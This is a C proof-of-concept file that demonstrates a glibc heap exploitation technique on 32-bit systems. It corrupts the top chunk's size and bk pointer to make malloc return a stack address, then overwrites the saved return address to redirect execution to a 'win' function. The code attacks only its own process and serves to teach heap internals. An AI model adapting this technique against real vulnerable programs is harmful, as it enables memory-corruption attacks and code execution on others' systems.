/* POC of House of Orange into House of Lore *
 * cc -m32 -o hoo hoo.c myprinter.c          *
 * or                                        *
 * cc -m32 -o hoo hoo.c -D DISABLE_MYPRINTER */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* myprinter prints without using nor affecting the heap */
#ifndef DISABLE_MYPRINTER
# include "myprinter.h"
# define U(x) ((uintptr_t) (x))
#else
# define myfprintf fprintf
# define XT "0x%08x"
# define BT "0x%02hhx"
# define U(x) ((int) (x))
#endif

#define STREAM stdout

#define colored_printf(fmt, ...) \
  myfprintf(STREAM, "\e[33m" fmt "\e[m", ##__VA_ARGS__)


/* ----------- MALLOC ----------- */
struct chunk {
  size_t prev_sz;
  size_t sz;
  void * fd;
  void * bk;
};

#define PAGE_SZ 0x1000

#define chk_get_size(chk) ( ((struct chunk *) (chk))->sz & ~0x7 )
#define chk_get_next_chunk(chk) ( (void *) (chk) + chk_get_size(chk) )
#define mem_get_chunk(mem) ( (void *) (mem) - offsetof(struct chunk, fd) )
#define mem_get_chunk_size(mem) ( chk_get_size(mem_get_chunk(mem)) )
#define mem_get_next_chunk(mem) ( chk_get_next_chunk(mem_get_chunk(mem)) )
#define mem_get_next_mem(mem) ( (void *) (mem) + mem_get_chunk_size(mem) )
/* ----------- MALLOC ----------- */

/* ----------- Helpers ---------- */
void print_hex_contents (void * addr, size_t count)
{
  colored_printf(XT ": ", U(addr));
  for (size_t i = 0; i < count; ++i) {
    colored_printf(BT " ", U(((char *) addr)[i]));
  }
  colored_printf("\n");
}

#define print_struct_ptr(x) \
do { \
  colored_printf(#x ":\n"); \
  print_hex_contents(x, sizeof(*x)); \
} while (0)

void colored_memcpy (char * dst, const char * src, size_t len)
{
  print_hex_contents(dst, len);
  colored_printf("\t\\-->\n");
  memcpy(dst, src, len);
  print_hex_contents(dst, len);
}

#define set(dst, src) \
do { \
  typeof(src) _src = src; \
  colored_printf(XT ": " XT " <- " XT "\n", U(&dst), U(dst), U(_src)); \
  dst = _src; \
} while (0)

intptr_t get_ebp (void) { __asm__("movl (%esp), %eax"); }
/* ----------- Helpers ---------- */


/* Getting eip to point here means the exploitation was successful */
__attribute__((noreturn)) void win (void)
{
  myfprintf(stdout, "PWNED! Good job :)\n");
  exit(EXIT_SUCCESS);
}

void lose (void) { myfprintf(stderr, "Exploit failed.\n"); }

/* ===== HOUSE OF ORANGE ===== */
void houseoforange (void)
{
/* 1) Chunk next to top */
  void * mem = malloc(1); /* contiguous to top */
  myfprintf(STREAM, "Allocated mem contiguous to top at " XT ".\n", U(mem));

  struct chunk * top = (struct chunk *) mem_get_next_chunk(mem);
  print_struct_ptr(top);

  myfprintf(STREAM,
    "As long as the (3) last nibbles of top.sz = " XT
    " remain unchanged, malloc won't complain.\n", U(top->sz));
  size_t new_top_size = top->sz & (PAGE_SZ - 1);

/* 2) Overflow it to corrupt top's size */
  set(top->sz, new_top_size);
  print_struct_ptr(top);

/* 3) Malloc of slightly big size: around PAGE_SZ = 0x1000 */
  myfprintf(STREAM,
    "Allocation answered in new heap at " XT ".\n", U(malloc(PAGE_SZ)));
  /*
   * Since PAGE_SZ > new_top_size, a new heap (and a new top) are allocated
   * from the system.
   * Then the old_top becomes an ordinary chunk that is to be freed
   * and put in the unsorted bin
   */
  #define old_top top/* alias for clarity */
  print_struct_ptr(old_top);


  /* ========================================= *
   * Unsorted Bin => House of Lore type attack *
   * ========================================= */

  struct chunk fake1, fake2;

  fake1.sz = fake2.sz = 0x11; /* MIN_SIZE | PREV_INUSE */
  // fake1.prev_sz = fake2.prev_sz = 0; /* doesn't matter */

  fake1.bk = (void *) &fake2;
  fake2.fd = (void *) &fake1;
  /* We got &fake1->bk->fd == &fake1 */

/* 4) Overflow again to corrupt top's bk ptr *
 * (leave the other fields as they are)      */
  set(old_top->bk, (void *) &fake1);
  fake1.fd = (void *) old_top;
  /* We got &old_top->bk->fd == &old_top */

  print_struct_ptr(old_top);
  intptr_t * array = malloc(1);      /* HoL => we get a 'corrupted' addr */
  myfprintf(STREAM, "array at " XT "\n", U(array));
  print_struct_ptr(old_top);

  /* array should now be pointing to the stack, thus near the saved eip */
  intptr_t offset_to_eip_idx =
    1 + (get_ebp() - (intptr_t) array) / sizeof(intptr_t);
  if (offset_to_eip_idx < 0x100) {
    colored_printf("Offset to IP = " BT " words\n", offset_to_eip_idx);
    set(array[offset_to_eip_idx], (intptr_t) &win);
  }
}

int main (int argc, char * argv[])
{
  houseoforange();
  lose();
  return 0;
}
